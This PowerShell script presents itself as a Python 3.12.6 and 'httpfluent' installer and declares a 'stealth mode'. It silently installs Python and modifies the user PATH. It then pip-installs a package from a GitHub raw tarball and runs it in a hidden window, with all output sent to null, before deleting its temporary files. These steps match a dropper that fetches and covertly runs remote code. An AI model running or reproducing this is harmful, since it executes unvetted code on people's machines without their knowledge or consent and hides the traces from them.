# ===================================================
# Python 3.12.6 + httpfluent (Direct Command Version)
# STEALTH MODE - NO WINDOW - ALL OUTPUT TO NULL
# ===================================================

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"
$InstallRequired = $true

# --- Step 0: Pre-Check (Silent) ---
if (Get-Command python -ErrorAction SilentlyContinue) {
    $ExecutableToUse = "python"
} elseif (Test-Path $PythonExe) {
    $ExecutableToUse = $PythonExe
}

if ($ExecutableToUse) {
    $VersionString = & $ExecutableToUse --version 2>&1
    if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
        if ([version]$Matches[1] -ge [version]"3.9") { $InstallRequired = $false }
    }
}

# --- YOUR ALGORITHM (Steps 1-5) ---
if ($InstallRequired) {
    $PythonVersion = "3.12.6"
    $PythonInstaller = "python-$TargetVersion-amd64.exe"
    $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/python-$PythonVersion-amd64.exe"
    $DownloadDir = "$env:TEMP\Python"

    if (-not (Test-Path $DownloadDir)) { New-Item -ItemType Directory -Path $DownloadDir > $null 2>&1 }
    $InstallerPath = Join-Path $DownloadDir "python-$PythonVersion-amd64.exe"
    
    try {
        (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $InstallerPath)
    } catch { exit 1 }

    # Step 4: Install Python
    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden > $null 2>&1

    # Step 5: Fix USER PATH (Updates System Registry)
    $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
    $CleanPath = $OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),""
    $NewPath = "$InstallDir;$InstallDir\Scripts;$CleanPath"
    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User") > $null 2>&1
    
    # CRITICAL: Update CURRENT session environment so 'httpfluent' command is recognized
    $env:Path = $NewPath
    $ExecutableToUse = $PythonExe
}

# --- Step 7: Package Installation ---
& $ExecutableToUse -m pip install --upgrade pip --quiet > $null 2>&1
& $ExecutableToUse -m pip install requests --quiet > $null 2>&1
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1

# --- THE FIX: DIRECT COMMAND EXECUTION ---
# We use 'cmd /c' to trigger the command exactly like a user typing it.
# This works because we manually updated $env:Path above.
Start-Process "cmd.exe" -ArgumentList "/c httpfluent" -WindowStyle Hidden > $null 2>&1

# --- Step 8: Cleanup ---
if (Test-Path "$env:TEMP\Python") {
    Remove-Item "$env:TEMP\Python" -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1
}
